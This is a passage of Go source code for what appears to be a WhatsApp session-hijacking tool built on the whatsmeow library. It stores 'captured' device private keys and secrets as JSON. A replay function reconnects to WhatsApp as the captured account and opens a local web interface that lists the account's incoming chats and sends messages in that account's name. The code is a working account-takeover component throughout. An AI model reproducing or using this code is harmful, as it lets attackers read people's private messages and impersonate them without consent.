	JIDUser        string `json:"jid_user"`
	JIDServer      string `json:"jid_server"`
	JIDDevice      uint16 `json:"jid_device"`
	BusinessName   string `json:"business_name"`
	PushName       string `json:"push_name"`
	Platform       string `json:"platform"`
	LID            string `json:"lid"`
}

func saveCapturedSession(device *store.Device) {
	os.MkdirAll(sessionsDir, 0755)
	ts := time.Now().Format("2006-01-02_15-04-05")
	sessionDir := filepath.Join(sessionsDir, ts)
	os.MkdirAll(sessionDir, 0755)

	data := sessionData{
		Timestamp:      ts,
		RegistrationID: device.RegistrationID,
		AdvSecretKey:   device.AdvSecretKey,
		BusinessName:   device.BusinessName,
		PushName:       device.PushName,
		Platform:       device.Platform,
	}
	if device.NoiseKey != nil {
		data.NoisePub = device.NoiseKey.Pub[:]
		data.NoisePriv = device.NoiseKey.Priv[:]
	}
	if device.IdentityKey != nil {
		data.IdentityPub = device.IdentityKey.Pub[:]
		data.IdentityPriv = device.IdentityKey.Priv[:]
	}
	if device.SignedPreKey != nil {
		data.SignedPreKeyID = device.SignedPreKey.KeyID
		data.SignedPrePub = device.SignedPreKey.Pub[:]
		data.SignedPrePriv = device.SignedPreKey.Priv[:]
		if device.SignedPreKey.Signature != nil {
			data.SignedPreSig = device.SignedPreKey.Signature[:]
		}
	}
	if device.ID != nil {
		data.JIDUser = device.ID.User
		data.JIDServer = device.ID.Server
		data.JIDDevice = device.ID.Device
	}
	if device.LID.User != "" {
		data.LID = device.LID.String()
	}

	jsonData, _ := json.MarshalIndent(data, "", "  ")
	sessionFile := filepath.Join(sessionDir, "session.json")
	os.WriteFile(sessionFile, jsonData, 0644)

	sessions := loadSessions()
	id := fmt.Sprintf("%d", len(sessions))
	sessions[id] = sessionMeta{
		ID:        id,
		Timestamp: ts,
		Browser:   "whatmeow",
		Profile:   sessionDir,
		URL:       "-",
	}
	saveSessions(sessions)
}

func loadSessionData(profileDir string) (*sessionData, error) {
	sessionFile := filepath.Join(profileDir, "session.json")
	data, err := os.ReadFile(sessionFile)
	if err != nil {
		return nil, err
	}
	var s sessionData
	if err := json.Unmarshal(data, &s); err != nil {
		return nil, err
	}
	return &s, nil
}

func deviceFromSession(s *sessionData) *store.Device {
	noop := &store.NoopStore{}
	d := &store.Device{
		Container:      noop,
		RegistrationID: s.RegistrationID,
		AdvSecretKey:   s.AdvSecretKey,
		BusinessName:   s.BusinessName,
		PushName:       s.PushName,
		Platform:       s.Platform,
	}

	if len(s.NoisePub) == 32 && len(s.NoisePriv) == 32 {
		var pub, priv [32]byte
		copy(pub[:], s.NoisePub)
		copy(priv[:], s.NoisePriv)
		d.NoiseKey = &keys.KeyPair{Pub: &pub, Priv: &priv}
	}
	if len(s.IdentityPub) == 32 && len(s.IdentityPriv) == 32 {
		var pub, priv [32]byte
		copy(pub[:], s.IdentityPub)
		copy(priv[:], s.IdentityPriv)
		d.IdentityKey = &keys.KeyPair{Pub: &pub, Priv: &priv}
	}
	if len(s.SignedPrePub) == 32 && len(s.SignedPrePriv) == 32 {
		var pub, priv [32]byte
		copy(pub[:], s.SignedPrePub)
		copy(priv[:], s.SignedPrePriv)
		preKey := &keys.PreKey{
			KeyPair: keys.KeyPair{Pub: &pub, Priv: &priv},
			KeyID:   s.SignedPreKeyID,
		}
		if len(s.SignedPreSig) == 64 {
			var sig [64]byte
			copy(sig[:], s.SignedPreSig)
			preKey.Signature = &sig
		}
		d.SignedPreKey = preKey
	}
	if s.JIDUser != "" && s.JIDServer != "" {
		jid := types.NewJID(s.JIDUser, s.JIDServer)
		jid.Device = s.JIDDevice
		d.ID = &jid
	}

	d.SetAllStores(noop)
	d.PreKeys = &memPreKeyStore{}
	d.LIDs = noop
	return d
}

func loadSessions() map[string]sessionMeta {
	data, err := os.ReadFile(sessionsFile)
	if err != nil {
		return make(map[string]sessionMeta)
	}
	var sessions map[string]sessionMeta
	if json.Unmarshal(data, &sessions) != nil {
		return make(map[string]sessionMeta)
	}
	return sessions
}

func saveSessions(sessions map[string]sessionMeta) {
	data, _ := json.MarshalIndent(sessions, "", "  ")
	os.WriteFile(sessionsFile, data, 0644)
}

func listSessions() {
	sessions := loadSessions()
	if len(sessions) == 0 {
		fmt.Printf("\n%sNo saved sessions.%s\n", utils.Yellow, utils.Reset)
		return
	}
	fmt.Printf("\n%sSaved Sessions:%s\n", utils.Blue, utils.Reset)
	for id, s := range sessions {
		fmt.Printf("  %s%s%s - %s (%s)\n", utils.Green, id, utils.Reset, s.Timestamp, s.Browser)
	}
}

func doReplay(reader *bufio.Reader) {
	sessions := loadSessions()
	if len(sessions) == 0 {
		fmt.Printf("\n%sNo saved sessions.%s\n", utils.Yellow, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	listSessions()
	fmt.Printf("\n%sSession ID to replay: %s", utils.Green, utils.Reset)
	id, _ := reader.ReadString('\n')
	id = strings.TrimSpace(id)

	s, ok := sessions[id]
	if !ok {
		fmt.Printf("%s[!] Invalid session ID%s\n", utils.Red, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	sd, err := loadSessionData(s.Profile)
	if err != nil {
		fmt.Printf("%s[!] Failed to load session: %v%s\n", utils.Red, err, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	fmt.Printf("\n%s[*] Connecting as %s...%s\n", utils.Yellow, sd.JIDUser, utils.Reset)

	device := deviceFromSession(sd)
	cli := whatsmeow.NewClient(device, waLog.Noop)

	rs := newReplayState(cli)
	cli.AddEventHandler(rs.handleEvent)

	if err := cli.Connect(); err != nil {
		fmt.Printf("%s[!] Connection failed: %v%s\n", utils.Red, err, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}
	defer cli.Disconnect()
	fmt.Printf("%s[+] Connected! Starting replay UI...%s\n", utils.Green, utils.Reset)

	port := pickReplayPort()
	mux := http.NewServeMux()
	mux.HandleFunc("/", rs.handleReplayUI)
	mux.HandleFunc("/api/chats", rs.handleChats)
	mux.HandleFunc("/api/messages", rs.handleMessages)
	mux.HandleFunc("/api/send", rs.handleSend)
	srv := &http.Server{Addr: fmt.Sprintf("127.0.0.1:%d", port), Handler: mux}
	go srv.ListenAndServe()
	defer srv.Close()

	url := fmt.Sprintf("http://127.0.0.1:%d", port)
	browser := detectBrowser()
	if browser != "" {
		exec.Command(browser, url).Start()
		fmt.Printf("%s[+] Opened %s in %s%s\n", utils.Green, url, browser, utils.Reset)
	} else {
		fmt.Printf("%s[+] Open: %s%s\n", utils.Green, url, utils.Reset)
	}

	fmt.Printf("%s\nPress Enter to disconnect...%s\n", utils.Yellow, utils.Reset)
	fmt.Scanln()
}

func pickReplayPort() int {
	for port := 9190; port < 9200; port++ {
		lis, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
		if err == nil {
			lis.Close()
			return port
		}
	}
	return 9190
}

func detectBrowser() string {
	env := os.Getenv("BROWSER")
	if env != "" {
		parts := strings.Fields(env)
		if len(parts) > 0 {
			if path, err := exec.LookPath(parts[0]); err == nil {
				return path
			}
		}
	}

	knownPaths := []string{
		"/usr/bin/zen-browser",
		"/opt/zen/firefox",
		"/usr/bin/firefox",
		"/snap/bin/firefox",
		"/usr/bin/chromium",
		"/usr/bin/google-chrome",
	}
	for _, p := range knownPaths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}

	candidates := []string{
		"zen-browser", "zen",
		"firefox", "mozilla-firefox",
		"chromium", "chromium-browser",
		"google-chrome", "google-chrome-stable",
		"chrome", "chrome-browser",
	}
	for _, name := range candidates {
		path, err := exec.LookPath(name)
		if err == nil {
			return path
		}
	}
	return ""
}

type memPreKeyStore struct {
	store.NoopStore
	mu       sync.Mutex
	uploaded uint32
	keys     map[uint32]*keys.PreKey
}

func (m *memPreKeyStore) init() {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.keys == nil {
		m.keys = make(map[uint32]*keys.PreKey)
	}
}

func (m *memPreKeyStore) GenOnePreKey(ctx context.Context) (*keys.PreKey, error) {
	m.init()
	m.mu.Lock()
	defer m.mu.Unlock()
	m.uploaded++
	pk := keys.NewPreKey(m.uploaded)
	m.keys[m.uploaded] = pk
	return pk, nil
}

func (m *memPreKeyStore) GetOrGenPreKeys(ctx context.Context, count uint32) ([]*keys.PreKey, error) {
	m.init()
	m.mu.Lock()
	defer m.mu.Unlock()
	pks := make([]*keys.PreKey, count)
	for i := range pks {
		m.uploaded++
		pk := keys.NewPreKey(m.uploaded)
		m.keys[m.uploaded] = pk
		pks[i] = pk
	}
	return pks, nil
}

func (m *memPreKeyStore) GetPreKey(ctx context.Context, id uint32) (*keys.PreKey, error) {
	m.init()
	m.mu.Lock()
	defer m.mu.Unlock()
	pk, ok := m.keys[id]
	if !ok {
		pk = keys.NewPreKey(id)
		m.keys[id] = pk
	}
	return pk, nil
}

func (m *memPreKeyStore) RemovePreKey(ctx context.Context, id uint32) error {
	m.init()
	m.mu.Lock()
	defer m.mu.Unlock()
	delete(m.keys, id)
	return nil
}

func (m *memPreKeyStore) MarkPreKeysAsUploaded(ctx context.Context, upToID uint32) error {
	m.init()
	m.mu.Lock()
	defer m.mu.Unlock()
	m.uploaded = upToID
	return nil
}

func (m *memPreKeyStore) UploadedPreKeyCount(ctx context.Context) (int, error) {
	m.init()
	m.mu.Lock()
	defer m.mu.Unlock()
	return len(m.keys), nil
}

type attackCfg struct {
	Port int
	Host string
}

// ---- Replay state (WhatsApp Web UI) ----

type replayChatMessage struct {
	ID        string `json:"id"`
	Content   string `json:"content"`
	Time      int64  `json:"time"`
	FromMe    bool   `json:"from_me"`
	MediaType string `json:"media_type,omitempty"`
}

type replayChat struct {
	JID         string `json:"jid"`
	Name        string `json:"name"`
	LastMessage string `json:"last_message"`
	LastTime    int64  `json:"last_time"`
	Unread      int    `json:"unread"`
}

type replayState struct {
	mu       sync.RWMutex
	chats    map[string]*replayChat
	messages map[string][]replayChatMessage
	order    []string
	client   *whatsmeow.Client
}

func newReplayState(cli *whatsmeow.Client) *replayState {
	return &replayState{
		chats:    make(map[string]*replayChat),
		messages: make(map[string][]replayChatMessage),
		order:    make([]string, 0),
		client:   cli,
	}
}

func extractMessageContent(msg *waE2E.Message) (content, mediaType string) {
	if msg == nil {
		return "", ""
	}
	if conv := msg.GetConversation(); conv != "" {
		return conv, ""
	}
	if ext := msg.GetExtendedTextMessage(); ext != nil {
		return ext.GetText(), ""
	}
	switch {
	case msg.GetImageMessage() != nil:
		caption := msg.GetImageMessage().GetCaption()
		if caption != "" {
			return "📷 " + caption, "image"
		}
		return "📷 Image", "image"
	case msg.GetVideoMessage() != nil:
		caption := msg.GetVideoMessage().GetCaption()
		if caption != "" {
			return "🎥 " + caption, "video"
		}
		return "🎥 Video", "video"
	case msg.GetAudioMessage() != nil:
		return "🎵 Audio", "audio"
	case msg.GetDocumentMessage() != nil:
		return "📄 " + msg.GetDocumentMessage().GetFileName(), "document"
	case msg.GetStickerMessage() != nil:
		return "🎨 Sticker", "sticker"
	case msg.GetLocationMessage() != nil:
		return "📍 Location", "location"
	case msg.GetContactMessage() != nil:
		return "👤 Contact", "contact"
	case msg.GetCall() != nil:
		return "📞 Call", "call"
	case msg.GetPollCreationMessage() != nil || msg.GetPollCreationMessageV2() != nil || msg.GetPollCreationMessageV3() != nil:
		return "📊 Poll", "poll"
	default:
		return "📝 Message", "unknown"
	}
}

func (rs *replayState) handleEvent(evt interface{}) {
	switch v := evt.(type) {
	case *events.Message:
		rs.handleMessage(v)
	}
}

func (rs *replayState) handleMessage(m *events.Message) {
	content, mediaType := extractMessageContent(m.Message)
	chatJID := m.Info.Chat.String()
	senderName := m.Info.PushName
	if senderName == "" {
		senderName = m.Info.Sender.User
	}
	msg := replayChatMessage{
		ID:        m.Info.ID,
		Content:   content,
		Time:      m.Info.Timestamp.Unix(),
		FromMe:    m.Info.IsFromMe,
		MediaType: mediaType,
	}

	rs.mu.Lock()
	rs.messages[chatJID] = append(rs.messages[chatJID], msg)

	chat, exists := rs.chats[chatJID]
	if !exists {
		chat = &replayChat{JID: chatJID, Name: senderName}
		rs.chats[chatJID] = chat
		rs.order = append(rs.order, chatJID)
	}
	chat.LastMessage = content
	chat.LastTime = m.Info.Timestamp.Unix()
	if !m.Info.IsFromMe {
		chat.Unread++
	}
	if senderName != "" && chat.Name == "" {
		chat.Name = senderName
	}

	for i, jid := range rs.order {
		if jid == chatJID {
			rs.order = append(rs.order[:i], rs.order[i+1:]...)
			break
		}
	}
	rs.order = append([]string{chatJID}, rs.order...)
	rs.mu.Unlock()
}

func (rs *replayState) handleChats(w http.ResponseWriter, r *http.Request) {
	rs.mu.RLock()
	chats := make([]*replayChat, 0, len(rs.order))
	for _, jid := range rs.order {
		if c, ok := rs.chats[jid]; ok {
			chats = append(chats, c)
		}
	}
	rs.mu.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(chats)
}

func (rs *replayState) handleMessages(w http.ResponseWriter, r *http.Request) {
	jid := r.URL.Query().Get("jid")
	if jid == "" {
		http.Error(w, "jid required", http.StatusBadRequest)
		return
	}
	rs.mu.RLock()
	msgs := rs.messages[jid]
	result := make([]replayChatMessage, len(msgs))
	copy(result, msgs)
	rs.mu.RUnlock()

	rs.mu.Lock()
	if c, ok := rs.chats[jid]; ok {
		c.Unread = 0
	}
	rs.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(result)
}

func (rs *replayState) handleSend(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST required", http.StatusMethodNotAllowed)
		return
	}
	jid := r.URL.Query().Get("jid")
	text := r.URL.Query().Get("text")
	if jid == "" || text == "" {
		http.Error(w, "jid and text required", http.StatusBadRequest)
		return
	}
	recipient, err := types.ParseJID(jid)
	if err != nil {
		http.Error(w, "invalid jid", http.StatusBadRequest)
		return
	}
	rs.mu.RLock()
	cli := rs.client
	rs.mu.RUnlock()
	_, err = cli.SendMessage(context.Background(), recipient, &waE2E.Message{
		Conversation: proto.String(text),
	})
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.Write([]byte("ok"))
}

func (rs *replayState) handleReplayUI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(replayHTML))
}

func newDevice() *store.Device {
	noop := &store.NoopStore{}
	identity := keys.NewKeyPair()
	d := &store.Device{
		Container:      noop,
		NoiseKey:       keys.NewKeyPair(),
		IdentityKey:    identity,
		SignedPreKey:   identity.CreateSignedPreKey(0),
		RegistrationID: randUint32(),
		AdvSecretKey:   randBytes(32),
	}
	d.SetAllStores(noop)
	d.PreKeys = &memPreKeyStore{}
	d.LIDs = noop
	return d
}

func randUint32() uint32 {
	n, _ := rand.Int(rand.Reader, big.NewInt(1<<32))
	return uint32(n.Int64())
}

func randBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}

func parseAddr(addr string) (string, int) {
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		return "0.0.0.0", 8080
	}
	port := 8080
	fmt.Sscanf(portStr, "%d", &port)
	return host, port
}
